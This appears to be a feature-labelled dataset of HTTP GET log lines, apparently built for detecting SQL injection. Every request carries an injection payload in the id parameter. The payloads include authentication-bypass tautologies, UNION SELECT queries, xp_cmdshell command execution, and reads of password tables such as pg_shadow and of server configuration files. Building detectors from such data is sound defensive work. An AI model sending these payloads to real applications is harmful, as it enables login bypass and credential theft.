33,1,200,4911,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
33,1,200,7769,7,4,12,2,1,GET ?id=') or ('1'='1'/* HTTP/1.1
26,1,200,2240,7,4,8,1,1,GET ?id=' or ''*' HTTP/1.1
26,1,200,2930,7,4,8,1,1,GET ?id=' or ''*' HTTP/1.1
26,1,200,3088,7,4,8,1,1,GET ?id=' or ''*' HTTP/1.1
30,1,200,6037,7,4,10,1,1,GET ?id=') or ('1'='1 HTTP/1.1
38,1,200,4851,7,9,11,3,1,GET login/?id=') or '1'='1'/* HTTP/1.1
52,1,200,3071,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,2098,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,3332,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,7578,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,2523,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,5786,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,2378,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
52,1,200,3347,7,30,6,2,1,GET login/?id=select * from syscat.tabauth; HTTP/1.1
35,1,200,6610,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,4259,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,7238,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,5330,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,1188,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,1386,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
24,1,200,1078,7,7,4,2,1,GET login/?id=' HTTP/1.1
24,1,200,2153,7,7,4,2,1,GET login/?id=' HTTP/1.1
26,1,200,4711,7,4,8,1,1,GET ?id=' or ''=' HTTP/1.1
26,1,200,2840,7,4,8,1,1,GET ?id=' or ''=' HTTP/1.1
26,1,200,7524,7,4,8,1,1,GET ?id=' or ''=' HTTP/1.1
91,1,200,6766,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,6425,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
91,1,200,5535,24,20,8,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
29,1,200,6549,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
29,1,200,4280,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
31,1,200,1863,7,4,11,1,1,GET ?id=' or '1'='1'-- HTTP/1.1
31,1,200,2327,7,4,11,1,1,GET ?id=' or '1'='1'-- HTTP/1.1
69,1,200,2132,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,3193,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,4594,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,2001,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,7439,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,7823,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
56,1,200,7268,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,4231,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
56,1,200,2501,7,20,13,2,1,GET login/?id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
28,1,200,5375,7,4,7,1,1,GET ?id=' or 0=0 -- HTTP/1.1
28,1,200,6419,7,4,7,1,1,GET ?id=' or 0=0 -- HTTP/1.1
33,1,200,3163,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,7177,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,7195,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,3981,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,4968,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
37,1,200,1061,7,9,11,2,1,GET login/?id=') or '1'='1-- HTTP/1.1
37,1,200,1778,7,9,11,2,1,GET login/?id=') or '1'='1-- HTTP/1.1
37,1,200,4476,7,9,11,2,1,GET login/?id=') or '1'='1-- HTTP/1.1
37,1,200,2759,7,9,11,2,1,GET login/?id=') or '1'='1-- HTTP/1.1
35,1,200,7112,7,9,10,1,1,GET ?id=admin') or ('1'='1 HTTP/1.1
52,1,200,4709,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
52,1,200,7980,7,29,7,1,2,GET ?id=exec master..xp_cmdshell 'net view' HTTP/1.1
38,1,200,7240,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,5667,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,7152,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,1065,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
51,1,200,3398,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,2439,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,4257,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,6204,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,7611,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
88,1,200,3866,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,2190,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
88,1,200,1553,17,50,7,1,1,GET ?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
36,1,200,6916,7,9,10,2,1,GET login/?id=') or ('1'='1 HTTP/1.1
36,1,200,2985,7,9,10,2,1,GET login/?id=') or ('1'='1 HTTP/1.1
36,1,200,3938,7,9,10,2,1,GET login/?id=') or ('1'='1 HTTP/1.1
36,1,200,3164,7,9,10,2,1,GET login/?id=') or ('1'='1 HTTP/1.1
36,1,200,6647,7,9,10,2,1,GET login/?id=') or ('1'='1 HTTP/1.1
59,1,200,5452,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,1049,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
59,1,200,5104,7,37,5,1,1,GET ?id=select session_user from sysibm.sysdummy1; HTTP/1.1
63,1,200,7944,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,4185,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,5585,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,6469,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,6307,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,7286,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,3808,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,3191,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,2864,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
63,1,200,7834,7,37,6,3,3,GET ?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
30,1,200,7303,7,9,6,2,1,GET login/?id='or'1=1 HTTP/1.1
30,1,200,3278,7,9,6,2,1,GET login/?id='or'1=1 HTTP/1.1
34,1,200,5448,7,11,8,2,1,GET login/?id=' or 'a'='a HTTP/1.1
34,1,200,1144,7,11,8,2,1,GET login/?id=' or 'a'='a HTTP/1.1
32,1,200,4011,7,9,5,2,0,GET login/?id= or 0=0 # HTTP/1.1
32,1,200,3298,7,9,5,2,0,GET login/?id= or 0=0 # HTTP/1.1
32,1,200,5833,7,9,5,2,0,GET login/?id= or 0=0 # HTTP/1.1
30,1,200,1584,7,6,10,1,1,GET ?id=') or ('x'='x HTTP/1.1
30,1,200,1408,7,6,10,1,1,GET ?id=') or ('x'='x HTTP/1.1
44,1,200,2427,7,14,13,2,1,GET login/?id='=' 'or' and '=' 'or' HTTP/1.1
26,1,200,3077,7,8,5,1,1,GET ?id=or true-- HTTP/1.1
28,1,200,4713,7,4,7,1,1,GET ?id=' or '1¡¬='1 HTTP/1.1
28,1,200,4437,7,4,7,1,1,GET ?id=' or '1¡¬='1 HTTP/1.1
68,1,200,2641,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,3530,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,7258,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,1789,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,3767,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,1641,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
25,1,200,4745,7,4,4,1,0,GET ?id= or 1=1¡V HTTP/1.1
69,1,200,4503,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5157,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5647,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,3485,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5738,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,2469,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,2566,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
64,1,200,4880,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,3114,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,6020,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,1942,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,3132,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,2803,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,6639,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
64,1,200,5382,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
33,1,200,6312,7,10,6,2,1,GET login/?id=' and 1='1 HTTP/1.1
31,1,200,2266,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,2686,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
31,1,200,7412,7,9,5,2,1,GET login/?id=' or 1=1 HTTP/1.1
52,1,200,2798,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,7834,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
52,1,200,6824,7,29,8,1,1,GET ?id=select current_setting('hba_file'); HTTP/1.1
31,1,200,6615,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,6742,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,1381,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,5652,7,13,3,2,1,GET login/?id= or true HTTP/1.1
31,1,200,6321,7,13,3,2,1,GET login/?id= or true HTTP/1.1
32,1,200,4906,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7027,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
41,1,200,4173,7,14,10,2,1,GET login/?id=admin' or '1'='1'# HTTP/1.1
31,1,200,5382,7,9,4,2,0,GET login/?id= or 1=1¡V HTTP/1.1
26,1,200,3213,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,4018,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,4596,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
94,1,200,6676,17,55,7,2,1,GET login/?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
94,1,200,4525,17,55,7,2,1,GET login/?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
75,1,200,6297,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,5248,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
75,1,200,4348,7,48,7,1,1,GET ?id=select * from syscat.tabauth where grantee = current user; HTTP/1.1
34,1,200,4449,7,9,7,2,1,GET login/?id=' or '1¡¬='1 HTTP/1.1
32,1,200,5816,7,4,12,1,1,GET ?id=') or ('1'='1'# HTTP/1.1
32,1,200,4620,7,4,12,1,1,GET ?id=') or ('1'='1'# HTTP/1.1
32,1,200,5391,7,4,12,1,1,GET ?id=') or ('1'='1'# HTTP/1.1
41,1,200,6270,7,18,6,2,1,GET login/?id=' or uname like '% HTTP/1.1
41,1,200,3025,7,18,6,2,1,GET login/?id=' or uname like '% HTTP/1.1
41,1,200,6524,7,18,6,2,1,GET login/?id=' or uname like '% HTTP/1.1
39,1,200,6262,7,15,8,2,1,GET login/?id=' or 'one'='one¡V HTTP/1.1
37,1,200,2544,7,9,12,1,1,GET ?id=admin') or '1'='1'-- HTTP/1.1
37,1,200,6486,7,9,12,1,1,GET ?id=admin') or '1'='1'-- HTTP/1.1
37,1,200,1661,7,9,12,1,1,GET ?id=admin') or '1'='1'-- HTTP/1.1
49,1,200,1701,7,23,7,1,1,GET ?id=' group by username having 1=1-- HTTP/1.1
49,1,200,6938,7,23,7,1,1,GET ?id=' group by username having 1=1-- HTTP/1.1
63,1,200,4130,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,1918,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,5772,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,2172,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,3261,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
97,1,200,3820,24,25,8,2,1,GET login/?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
97,1,200,4404,24,25,8,2,1,GET login/?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
97,1,200,6474,24,25,8,2,1,GET login/?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
24,1,200,4600,7,4,5,1,0,GET ?id=or 1=1# HTTP/1.1
35,1,200,5584,12,4,7,1,1,GET ?id=' or 1=1 LIMIT 1;# HTTP/1.1
35,1,200,6958,12,4,7,1,1,GET ?id=' or 1=1 LIMIT 1;# HTTP/1.1
37,1,200,2266,7,9,11,2,1,GET ?id=admin') or '1'='1'/* HTTP/1.1
37,1,200,5666,7,9,11,2,1,GET ?id=admin') or '1'='1'/* HTTP/1.1
37,1,200,2196,7,9,11,2,1,GET ?id=admin') or '1'='1'/* HTTP/1.1
41,1,200,1718,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,6296,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,6155,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,2028,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,4188,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,2985,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,1208,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,7323,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
41,1,200,6356,7,20,5,1,1,GET ?id=select * from pg_shadow; HTTP/1.1
24,1,200,2510,7,4,4,1,0,GET ?id= or 1=1 HTTP/1.1
24,1,200,3586,7,4,4,1,0,GET ?id= or 1=1 HTTP/1.1
24,1,200,3752,7,4,4,1,0,GET ?id= or 1=1 HTTP/1.1
24,1,200,6992,7,4,4,1,0,GET ?id= or 1=1 HTTP/1.1
44,1,200,6061,7,21,6,2,1,GET login/?id=' or username like '% HTTP/1.1
44,1,200,4201,7,21,6,2,1,GET login/?id=' or username like '% HTTP/1.1
44,1,200,4489,7,21,6,2,1,GET login/?id=' or username like '% HTTP/1.1
20,2,200,3544,7,2,6,1,1,GET ?id='&' HTTP/1.1
20,2,200,1577,7,2,6,1,1,GET ?id='&' HTTP/1.1
18,1,200,1661,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,1569,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,1241,7,2,4,1,1,GET ?id=' HTTP/1.1
61,1,200,2035,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,1428,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
61,1,200,4026,7,37,8,2,1,GET login/?id=select current_setting('config_file'); HTTP/1.1
36,1,200,5383,7,11,10,2,1,GET login/?id=') or ('a'='a HTTP/1.1
20,1,200,6491,7,2,6,1,1,GET ?id='*' HTTP/1.1
32,1,200,1402,7,6,9,1,1,GET ?id='or 1=1 or ''=' HTTP/1.1
32,1,200,1816,7,6,9,1,1,GET ?id='or 1=1 or ''=' HTTP/1.1
32,1,200,7795,7,6,9,1,1,GET ?id='or 1=1 or ''=' HTTP/1.1
32,1,200,7561,7,6,9,1,1,GET ?id='or 1=1 or ''=' HTTP/1.1
34,1,200,4972,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,6505,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
39,1,200,2340,7,14,8,2,1,GET login/?id=admin' or '1'='1 HTTP/1.1
61,1,200,5815,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,1391,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
61,1,200,4176,7,39,5,1,1,GET ?id=select current server from sysibm.sysdummy1; HTTP/1.1
20,1,200,3728,7,2,6,1,1,GET ?id='^' HTTP/1.1
20,1,200,4090,7,2,6,1,1,GET ?id='^' HTTP/1.1
37,1,200,4807,7,9,10,3,1,GET login/?id=' or '1'='1'/* HTTP/1.1
37,1,200,6460,7,9,10,3,1,GET login/?id=' or '1'='1'/* HTTP/1.1
37,1,200,5346,7,9,10,3,1,GET login/?id=' or '1'='1'/* HTTP/1.1
37,1,200,4319,7,9,10,3,1,GET login/?id=' or '1'='1'/* HTTP/1.1
33,1,200,3552,7,9,8,1,1,GET ?id=admin' or '1'='1 HTTP/1.1
33,1,200,6364,7,9,8,1,1,GET ?id=admin' or '1'='1 HTTP/1.1
33,1,200,6026,7,9,8,1,1,GET ?id=admin' or '1'='1 HTTP/1.1
38,1,200,5958,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
38,1,200,6773,7,15,8,2,1,GET login/?id=' or 'one'='one HTTP/1.1
26,1,200,6794,7,7,6,2,1,GET login/?id='-' HTTP/1.1
26,1,200,7540,7,7,6,2,1,GET login/?id='-' HTTP/1.1
42,1,200,3110,7,19,6,2,1,GET login/?id=' or userid like '% HTTP/1.1
35,1,200,2865,7,9,10,1,1,GET ?id=admin' or '1'='1'# HTTP/1.1
35,1,200,3434,7,9,10,1,1,GET ?id=admin' or '1'='1'# HTTP/1.1
38,1,200,4462,7,9,12,2,1,GET ?id=admin') or ('1'='1'/* HTTP/1.1
38,1,200,4331,7,9,12,2,1,GET ?id=admin') or ('1'='1'/* HTTP/1.1
31,1,200,3786,9,4,11,1,1,GET ?id=' OR 'x'='x'#; HTTP/1.1
31,1,200,2604,9,4,11,1,1,GET ?id=' OR 'x'='x'#; HTTP/1.1
31,1,200,5862,9,4,11,1,1,GET ?id=' OR 'x'='x'#; HTTP/1.1
31,1,200,2290,9,4,11,1,1,GET ?id=' OR 'x'='x'#; HTTP/1.1
31,1,200,5334,9,4,11,1,1,GET ?id=' OR 'x'='x'#; HTTP/1.1
42,1,200,6163,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,2860,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
42,1,200,7024,7,14,10,3,1,GET login/?id=admin' or '1'='1'/* HTTP/1.1
32,1,200,3514,7,10,4,2,0,GET login/?id= and 1=1¡V HTTP/1.1
32,1,200,5803,7,10,4,2,0,GET login/?id= and 1=1¡V HTTP/1.1
32,1,200,7246,7,10,4,2,0,GET login/?id= and 1=1¡V HTTP/1.1
32,1,200,1033,7,10,4,2,0,GET login/?id= and 1=1¡V HTTP/1.1
32,1,200,5290,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2583,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
56,1,200,7473,7,26,10,2,1,GET ?id=' and substring(password/text()_1_1)='7 HTTP/1.1
56,1,200,1028,7,26,10,2,1,GET ?id=' and substring(password/text()_1_1)='7 HTTP/1.1
56,1,200,1726,7,26,10,2,1,GET ?id=' and substring(password/text()_1_1)='7 HTTP/1.1
56,1,200,4410,7,26,10,2,1,GET ?id=' and substring(password/text()_1_1)='7 HTTP/1.1
56,1,200,3453,7,26,10,2,1,GET ?id=' and substring(password/text()_1_1)='7 HTTP/1.1
26,1,200,5770,7,7,4,2,1,GET login/?id=' ¡V HTTP/1.1
57,1,200,3488,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,7802,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
57,1,200,6779,7,36,5,2,1,GET login/?id=select name from sysibm.systables; HTTP/1.1
33,1,200,4372,7,9,7,2,1,GET login/?id=' or 1=1;# HTTP/1.1
23,1,200,6324,7,4,6,1,1,GET ?id='="or' HTTP/1.1
23,1,200,6393,7,4,6,1,1,GET ?id='="or' HTTP/1.1
36,1,200,6911,7,14,5,2,1,GET login/?id=admin' or 1=1 HTTP/1.1
36,1,200,7058,7,14,5,2,1,GET login/?id=admin' or 1=1 HTTP/1.1
36,1,200,1261,7,14,5,2,1,GET login/?id=admin' or 1=1 HTTP/1.1
36,1,200,7537,7,14,5,2,1,GET login/?id=admin' or 1=1 HTTP/1.1
36,1,200,7420,7,14,5,2,1,GET login/?id=admin' or 1=1 HTTP/1.1
55,1,200,7162,7,28,7,2,1,GET login/?id=' group by username having 1=1-- HTTP/1.1
55,1,200,3085,7,28,7,2,1,GET login/?id=' group by username having 1=1-- HTTP/1.1
55,1,200,3288,7,28,7,2,1,GET login/?id=' group by username having 1=1-- HTTP/1.1
39,1,200,4084,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,3587,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,7130,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,7351,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
32,1,200,7518,7,9,7,1,1,GET ?id=admin' or 1=1-- HTTP/1.1
29,1,200,4032,7,8,7,1,1,GET ?id=') or true-- HTTP/1.1
29,1,200,2963,7,8,7,1,1,GET ?id=') or true-- HTTP/1.1
29,1,200,6392,7,8,7,1,1,GET ?id=') or true-- HTTP/1.1
29,1,200,4574,7,8,7,1,1,GET ?id=') or true-- HTTP/1.1
32,1,200,5767,7,9,8,2,1,GET login/?id=' or ''=' HTTP/1.1
32,1,200,1503,7,13,5,2,1,GET login/?id=or true-- HTTP/1.1
25,1,200,5527,7,4,5,2,2,GET ?id=or 1=1/* HTTP/1.1
25,1,200,5845,7,4,5,2,2,GET ?id=or 1=1/* HTTP/1.1
26,1,200,5299,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
26,1,200,3750,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
26,1,200,3853,7,4,5,1,1,GET ?id=' or 1=1¡V HTTP/1.1
43,1,200,3224,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
43,1,200,1569,7,14,11,3,1,GET login/?id=admin') or '1'='1'/* HTTP/1.1
32,1,200,7395,7,11,5,2,1,GET login/?id=' or a=a¡V HTTP/1.1
30,1,200,7633,7,9,5,2,0,GET login/?id=or 1=1# HTTP/1.1
32,1,200,3711,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
32,1,200,5224,7,9,8,2,1,GET login/?id=' or ''-' HTTP/1.1
29,1,200,2317,7,9,6,2,1,GET login/?id='="or' HTTP/1.1
29,1,200,2492,7,9,6,2,1,GET login/?id='="or' HTTP/1.1
29,1,200,1768,7,9,6,2,1,GET login/?id='="or' HTTP/1.1
32,1,200,7134,7,9,4,2,0,GET login/?id= or 0=0 ¡V HTTP/1.1
37,1,200,2586,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,5751,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,2795,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,3444,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,5926,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,3494,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
37,1,200,1821,7,19,4,1,0,GET ?id=select session_user; HTTP/1.1
20,1,200,3472,7,2,6,1,1,GET ?id='-- HTTP/1.1
20,1,200,2147,7,2,6,1,1,GET ?id='-- HTTP/1.1
44,1,200,7636,7,14,13,2,1,GET login/?id=admin') or ('1'='1'-- HTTP/1.1
42,1,200,3537,7,14,11,2,1,GET login/?id=admin') or '1'='1'# HTTP/1.1
30,1,200,6740,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,5112,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
30,1,200,5792,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
50,1,200,2343,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,3144,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,7752,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
50,1,200,7274,7,29,6,1,1,GET ?id=select * from master..sysserverse HTTP/1.1
26,1,200,2958,7,7,6,1,1,GET ?id=admin' -- HTTP/1.1
26,1,200,7571,7,7,6,1,1,GET ?id=admin' -- HTTP/1.1
30,1,200,2773,7,4,10,1,1,GET ?id=' or '1'='1'# HTTP/1.1
